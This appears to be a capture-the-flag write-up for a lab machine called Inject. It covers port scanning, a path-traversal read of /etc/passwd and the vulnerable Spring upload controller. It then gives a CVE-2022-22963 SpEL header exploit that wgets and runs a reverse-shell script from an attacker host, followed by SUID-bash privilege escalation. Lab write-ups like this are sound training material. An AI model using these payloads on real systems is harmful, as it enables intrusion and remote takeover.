# Inject

## IP = 10.10.11.204

### Initial
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-20 10:29 EDT
Nmap scan report for 10.10.11.204            
Host is up (0.066s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT      STATE    SERVICE        VERSION              
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                                                       
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
70/tcp    filtered gopher
512/tcp   filtered exec
668/tcp   filtered mecomm
1062/tcp  filtered veracity
2160/tcp  filtered apc-2160
3323/tcp  filtered active-net
5631/tcp  filtered pcanywheredata
5679/tcp  filtered activesync
5811/tcp  filtered unknown
6389/tcp  filtered clariion-evr01
6543/tcp  filtered mythtv
8080/tcp  open     nagios-nsca    Nagios NSCA
|_http-title: Home
15660/tcp filtered bex-xr
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Possible users: admin, Brandon Auger

### Gobuster
/register
/blogs
/uploade
/environment
/error
/release_notes


### LFI: http://10.10.11.204:8080/show_image?img=../../../../../../../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```

### Directory listing enabled
Table: zodd_users

```java
package com.example.WebApp.user;

import org.springframework.core.io.Resource;
import org.springframework.core.io.UrlResource;

import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;


import java.nio.file.Path;
import org.springframework.ui.Model;

import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.activation.*;
import java.io.*;
import java.net.MalformedURLException;
import java.nio.file.Files;

import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;

@Controller
public class UserController {

    private static String UPLOADED_FOLDER = "/var/www/WebApp/src/main/uploads/";

    @GetMapping("")
    public String homePage(){
        return "homepage";
    }

    @GetMapping("/register")
    public String signUpFormGET(){
        return "under";
    }

    @RequestMapping(value = "/upload", method = RequestMethod.GET)
    public String UploadFormGet(){
        return "upload";
    }

    @RequestMapping(value = "/show_image", method = RequestMethod.GET)
    public ResponseEntity getImage(@RequestParam("img") String name) {
        String fileName = UPLOADED_FOLDER + name;
        Path path = Paths.get(fileName);
        Resource resource = null;
        try {
            resource = new UrlResource(path.toUri());
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);
    }

    @PostMapping("/upload")
    public String Upload(@RequestParam("file") MultipartFile file, Model model){
        String fileName = StringUtils.cleanPath(file.getOriginalFilename());
        if (!file.isEmpty() && !fileName.contains("/")){
            String mimetype = new MimetypesFileTypeMap().getContentType(fileName);
            String type = mimetype.split("/")[0];
            if (type.equals("image")){

                try {
                    Path path = Paths.get(UPLOADED_FOLDER+fileName);
                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e){
                    e.printStackTrace();
                }
                model.addAttribute("name", fileName);
                model.addAttribute("message", "Uploaded!");
            } else {
                model.addAttribute("message", "Only image files are accepted!");
            }
            
        } else {
            model.addAttribute("message", "Please Upload a file!");
        }
        return "upload";
    }

    @GetMapping("/release_notes")
    public String changelog(){
        return "change";
    }

    @GetMapping("/blogs")
    public String blogPage(){
        return "blog";
    }
    
}

```

### pom.xml has cloud-functions dependency version 3.2.2
```
<dependency>
	<groupId>org.springframework.cloud</groupId>
	<artifactId>spring-cloud-function-web</artifactId>
	<version>3.2.2</version>
</dependency>
```

### CVE-2022-22963: https://github.com/dinosn/CVE-2022-22963

### Steps:
```
POST /functionRouter HTTP/1.1
Host: 10.10.11.204:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("/var/www/rev.sh")
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

1. spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("wget http://10.10.16.36:8000/rev.sh -P /var/www/")
2. spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("chmod +x /var/www/rev.sh")
3. spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("/var/www/rev.sh")

/home/phil/.viminfo
/usr/sbin/ModemManager 

### Privesc: /usr/bin/bash has suid bit set
`/usr/bin/bash -p`

### user.txt
### root.txt